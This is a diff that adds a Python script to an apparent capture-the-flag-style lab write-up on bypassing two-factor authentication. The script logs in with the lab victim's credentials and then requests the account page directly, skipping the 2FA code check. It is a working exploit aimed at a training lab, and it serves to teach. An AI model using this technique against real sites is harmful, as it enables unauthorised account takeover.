@@ -59,6 +59,61 @@ This lab's two-factor authentication can be bypassed. You have already obtained 
 ![Bypassed 2FA](/assets/images/auth-2/bypassed2fa.png)
 **Nice going to the endpoint `my-account`actually bypass the 2fa security check , that means the application doesnot check that we entered the 2fa code or not.**
 
+## Automating through Python : 
+```python
+import requests
+import urllib3
+import sys
+
+urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)
+
+proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+
+
+
+def access_Carlos(url,s):
+    print("[+]Attempting to break the 2FA from the carlos i.e victim account")
+    login_url = url +"/login"
+    data = {"username":"carlos","password":"montoya"}
+    # we will be sending a POST request hai
+    req = s.post(login_url,data=data,verify=False,proxies=proxies)
+    if "Please enter your 4-digit security code" in req.text:
+        print("[+]YOu have successfully entered to 2fa verify page")
+        
+        # going to /my-account in place of /login2
+        
+        new_url = url +"/my-account"
+        Cookie={"Cookie": "YOUR_COOKIE_VALUE"}
+        req=s.get(new_url,verify=False,proxies=proxies,cookies=Cookie)
+        
+        if "?id=carlos" in req.text:
+            print("[+] Congrats we successfully bypass the 2fa")
+        else:
+            print("[-]Try again don't worry")
+    else:
+        print("something wrong");
+        exit(0)
+    
+    # now we will be having /my-account after login to get the page
+
+
+def main():
+    if len(sys.argv)!=2:
+        print("(+)Usage %s <url>" % sys.argv[0])
+        print("(+)Example %s www.example.com" % sys.argv[0])
+    else:
+        url = sys.argv[1]
+        s= requests.Session()
+        access_Carlos(url,s)
+
+
+
+
+if __name__=="__main__":
+    main()
+```
+**So this python script does the job as well to bypass this lab 2fa**
+
 # What we've learned:
 
 1. 2FA simple bypass
